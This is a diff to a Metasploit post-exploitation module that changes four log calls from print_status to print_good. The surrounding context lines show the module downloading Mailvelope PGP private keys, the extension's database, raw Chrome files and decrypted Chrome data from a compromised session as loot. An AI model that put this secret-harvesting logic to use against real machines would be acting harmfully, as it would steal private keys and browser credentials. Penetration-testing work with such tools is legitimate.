@@ -48,7 +48,7 @@ class MetasploitModule < Msf::Post
       vprint_good(key_data)
       path = store_loot(
         "chrome.mailvelope.#{priv_or_pub}", "text/plain", session, key_data, "#{priv_or_pub}.key", "Mailvelope PGP #{priv_or_pub.capitalize} Key")
-      print_status("==> Saving #{priv_or_pub} key to: #{path}")
+      print_good("==> Saving #{priv_or_pub} key to: #{path}")
     end
   end
 
@@ -62,7 +62,7 @@ class MetasploitModule < Msf::Post
     print_status("==> Downloading Mailvelope database...")
     local_path = store_loot("chrome.ext.mailvelope", "text/plain", session, "chrome_ext_mailvelope")
     session.fs.file.download_file(local_path, maildb_path)
-    print_status("==> Downloaded to #{local_path}")
+    print_good("==> Downloaded to #{local_path}")
 
     maildb = SQLite3::Database.new(local_path)
     columns, *rows = maildb.execute2("select * from ItemTable;")
@@ -170,7 +170,7 @@ class MetasploitModule < Msf::Post
 
     if secrets != ""
       path = store_loot("chrome.decrypted", "text/plain", session, decrypt_table.to_s, "decrypted_chrome_data.txt", "Decrypted Chrome Data")
-      print_status("Decrypted data saved in: #{path}")
+      print_good("Decrypted data saved in: #{path}")
     end
   end
 
@@ -192,7 +192,7 @@ class MetasploitModule < Msf::Post
       local_path = store_loot("chrome.raw.#{f}", "text/plain", session, "chrome_raw_#{f}")
       raw_files[f] = local_path
       session.fs.file.download_file(local_path, remote_path)
-      print_status("Downloaded #{f} to '#{local_path}'")
+      print_good("Downloaded #{f} to '#{local_path}'")
     end
 
     #Assign raw file paths to @chrome_files
